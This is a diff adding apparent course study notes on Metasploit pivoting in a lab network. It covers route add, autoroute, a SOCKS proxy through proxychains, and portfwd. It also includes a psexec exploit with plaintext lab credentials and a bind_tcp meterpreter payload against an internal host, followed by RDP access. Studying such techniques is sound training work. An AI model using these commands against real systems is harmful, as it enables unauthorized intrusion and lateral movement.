@@ -1,0 +1,56 @@
+
+- Example:
+		- As in the previous sections, we'll connect to the bind shell on port 4444 on the machine ITWK01. Let's assume we are currently gathering information on the target. In this step, we'll identify a second network interface.
+	- `ipconfig`
+	- Listing 74 shows that the second interface has the assigned IP 172.16.5.199.
+	- Get meterpreter shell with **met.exe**
+	- `bg`
+	- **route add**
+		- To add a route to a network reachable through a compromised host
+		- ```route add 172.16.5.0/24 12```
+		- route add $ip $session
+	- **route print**
+	- scan ports
+		- ```use auxiliary/scanner/portscan/tcp ```
+		- ```set RHOSTS 172.16.5.200```
+		- ```set PORTS 445,3389```
+		- `run`
+	- SMB & RDP ports found
+	- Attempt to use *psexec*
+		- username is luiza
+		- password is _BoccieDearAeroMeow1!_.
+	- Let's use _exploit/windows/smb/psexec_ and set **SMBUser** to **luiza**, **SMBPass** to **BoccieDearAeroMeow1!**, and **RHOSTS** to **172.16.5.200**.
+	- [It's important to note that the added route will only work with established connections. Because of this, the new shell on the target must be a bind shell such as _windows/x64/meterpreter/bind_tcp_, thus allowing us to use the set route to connect to it. A reverse shell payload would not be able to find its way back to our attacking system in most situations because the target does not have a route defined for our network.]
+		- ```use exploit/windows/smb/psexec ```
+		- ```set SMBUser luiza```
+		- ```set SMBPass "BoccieDearAeroMeow1!"```
+		- ```set RHOSTS 172.16.5.200```
+		- ```set payload windows/x64/meterpreter/bind_tcp```
+		- `set LPORT 8000`
+		- `run`
+	- **route flush**
+		- removes manual routes
+	- **autoroute** module
+		- set up pivot routes through an existing Meterpreter session automatically
+		- ```use multi/manage/autoroute```
+		- `show options`
+		- `sessions -l`
+		- `set session 12`
+		- `run`
+	- **server/socks_proxy** auxiliary module to configure a SOCKS proxy
+		- pivot on port 1080 by default
+		- ```use auxiliary/server/socks_proxy```
+		- `show options`
+		- ```set SRVHOST 127.0.0.1```
+		- `set VERSION 5`
+		- `run -j`
+		- update *proxychains* config file
+			- ```socks5 127.0.0.1 1080```
+		- ```sudo proxychains xfreerdp /v:172.16.97.200 /u:luiza```
+	- use a similar technique for port forwarding using the **portfwd** command from inside a Meterpreter session, which will forward a specific port to the internal network.
+		- `sessions -i 12`
+		- `portfwd -h`
+	- We can create a port forward from localhost port 3389 to port 3389 on the target host (172.16.5.200)
+		- ```portfwd add -l 3389 -p 3389 -r 172.16.97.200```
+	- Test
+		- ```sudo xfreerdp /v:127.0.0.1 /u:luiza```
